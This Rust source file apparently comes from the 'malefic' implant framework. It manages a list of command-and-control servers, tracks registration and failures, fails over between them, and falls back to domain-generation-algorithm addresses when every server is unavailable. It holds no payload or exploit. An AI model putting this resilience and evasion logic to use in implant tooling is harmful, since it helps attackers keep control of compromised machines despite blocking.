use std::time::{Duration, Instant};
use malefic_helper::debug;
use crate::config::ServerConfig;

/// 服务器状态枚举
#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone, PartialEq)]
pub enum ServerStatus {
    NotRegistered,
    Registered,
    Unavailable,
}

/// 单个服务器信息
#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ServerInfo {
    pub address: String,
    pub server_config: ServerConfig,
    pub status: ServerStatus,
    pub last_success: Option<Instant>,
    pub last_failure: Option<Instant>,
    pub consecutive_failures: u32,
    pub can_retry: bool,
}

/// 服务器管理器
#[cfg_attr(debug_assertions, derive(Debug))]
pub struct ServerManager {
    pub servers: Vec<ServerInfo>,
    pub current_index: usize,
    pub max_retry_per_server: u32,
    pub max_global_retry: u32,
    pub connection_timeout: Duration,
    pub enable_dga: bool,
    pub has_registered: bool,
    #[cfg(feature = "dga")]
    dga_generator: Option<crate::dga::DgaGenerator>,
    pub dga_mode: bool,
}

impl ServerManager {
    pub const INITIAL_REGISTRATION_ATTEMPTS: u32 = 3;

    pub fn new(
        server_configs: Vec<ServerConfig>,
        config: Option<(u32, u32, Duration, bool)>,
    ) -> Self {
        use crate::config::{DGA_ENABLE, GLOBAL_RETRY, SERVER_RETRY};

        let (max_retry_per_server, max_global_retry, connection_timeout, enable_dga) =
            config.unwrap_or_else(|| {
                (
                    *SERVER_RETRY,
                    *GLOBAL_RETRY,
                    Duration::from_secs(10),
                    *DGA_ENABLE,
                )
            });
        
        #[cfg(feature = "dga")]
        let dga_generator = if enable_dga {
            //
            let dga_configs: Vec<ServerConfig> = server_configs.iter()
                .filter(|config| config.supports_dga())
                .cloned()
                .collect();

            if !dga_configs.is_empty() {
                match crate::dga::DgaGenerator::from_server_configs(dga_configs) {
                    Ok(gen) => Some(gen),
                    Err(_e) => {
                        debug!("[server_manager] Failed to create DGA generator: {:?}", _e);
                        None
                    }
                }
            } else {
                debug!("[server_manager] No servers support DGA");
                None
            }
        } else {
            None
        };

        let mut servers: Vec<ServerInfo> = Vec::new();
        for server_config in server_configs {
            let address = server_config.address.clone();
            if servers.iter().any(|s| s.address.as_str() == address.as_str()) {
                continue;
            }
            servers.push(ServerInfo {
                address,
                server_config,
                status: ServerStatus::NotRegistered,
                last_success: None,
                last_failure: None,
                consecutive_failures: 0,
                can_retry: true,
            });
        }
       
        #[cfg(feature = "dga")]
        let dga_enable = dga_generator.is_some();
        #[cfg(not(feature = "dga"))]
        let dga_enable = false;

        Self {
            servers,
            current_index: 0,
            max_retry_per_server,
            max_global_retry,
            connection_timeout,
            enable_dga,
            has_registered: false,
            #[cfg(feature = "dga")]
            dga_generator,
            dga_mode: dga_enable
        }
    }

    /// 获取当前服务器
    pub fn current_server(&self) -> Option<&ServerInfo> {
        self.servers.get(self.current_index)
    }

    pub fn current_server_config(&mut self) -> Option<ServerConfig> {
        self.servers.get(self.current_index).map(|s| s.server_config.clone())
    }

    /// 获取当前服务器URL
    pub fn current_address(&self) -> Option<&str> {
        self.current_server().map(|s| s.address.as_str())
    }


    /// 标记当前服务器注册成功
    pub fn mark_register(&mut self) {
        if let Some(server) = self.servers.get_mut(self.current_index) {
            server.status = ServerStatus::Registered;
            server.last_success = Some(Instant::now());
            server.consecutive_failures = 0;
            self.has_registered = true;
            debug!("[server_manager] Server {} registration successful", server.address);
        }
    }

    /// 标记当前服务器通信成功
    pub fn mark_success(&mut self) {
        if let Some(server) = self.servers.get_mut(self.current_index) {
            server.last_success = Some(Instant::now());
            server.consecutive_failures = 0;
            debug!("[server_manager] Server {} communication successful", server.address);
        }
    }

    /// 标记当前服务器连接失败
    pub fn mark_failure(&mut self) {
        if let Some(server) = self.servers.get_mut(self.current_index) {
            server.last_failure = Some(Instant::now());
            server.consecutive_failures += 1;

            if server.consecutive_failures >= self.max_retry_per_server {
                server.status = ServerStatus::Unavailable;
                debug!("[server_manager] Server {} marked as unavailable after {} failures",
                       server.address, server.consecutive_failures);
            } else {
                debug!("[server_manager] Server {} failure count: {}/{}",
                       server.address, server.consecutive_failures, self.max_retry_per_server);
            }
        }
    }

    /// 检查当前服务器是否应该重试
    pub fn retry_current(&self) -> bool {
        if let Some(server) = self.current_server() {
            server.consecutive_failures < self.max_retry_per_server
        } else {
            false
        }
    }

    /// 检查当前服务器是否已注册过
    pub fn is_registered(&self) -> bool {
        if let Some(server) = self.current_server() {
            server.status == ServerStatus::Registered
        } else {
            false
        }
    }

    /// 切换到下一个服务器（按优先级顺序）
    pub fn switch_to_next(&mut self) -> bool {
        let total_servers = self.servers.len();

        if total_servers == 0 {
            return false;
        }

        // 尝试下一个正常服务器
        for step in 1..=total_servers {
            let next_index = (self.current_index + step) % total_servers;

            if let Some(server) = self.servers.get(next_index) {
                // 只要不是Unavailable状态就可以尝试
                if server.status != ServerStatus::Unavailable {
                    self.current_index = next_index;
                    debug!("[server_manager] Switched to server {} (index: {})",
                           server.address, next_index);
                    return true;
                }
            }
        }

        #[cfg(feature = "dga")]
        {
            if self.enable_dga {
                // dga_generator生成servers然后，push到servers里
                let new_servers = if let Some(ref dga_generator) = self.dga_generator {
                    dga_generator.generate_new_server()
                } else {
                    vec![]
                };
                for server_config in new_servers {
                    let address = server_config.address.clone();
                    if self.servers.iter().any(|s| s.address.as_str() == address.as_str()) {
                        continue;
                    }
                    self.servers.push(ServerInfo {
                        address,
                        server_config,
                        status: ServerStatus::NotRegistered,
                        last_success: None,
                        last_failure: None,
                        consecutive_failures: 0,
                        can_retry: true,
                    });
                }

                if self.current_index + 1 < self.servers.len() {
                    self.current_index += 1;
                } else if !self.servers.is_empty() {
                    self.current_index = self.servers.len().saturating_sub(1);
                }
                debug!("[server_manager] Switched to next DGA server (index: {})", self.current_index);
                return true;
            }
        }

        self.current_index = 0;
        true
    }
    
}

#[cfg_attr(debug_assertions, derive(Debug))]
pub struct ServerStats {
    pub total: usize,
    pub registered: usize,
    pub not_registered: usize,
    pub unavailable: usize,
    pub current_index: usize,
    pub has_registered: bool,
}
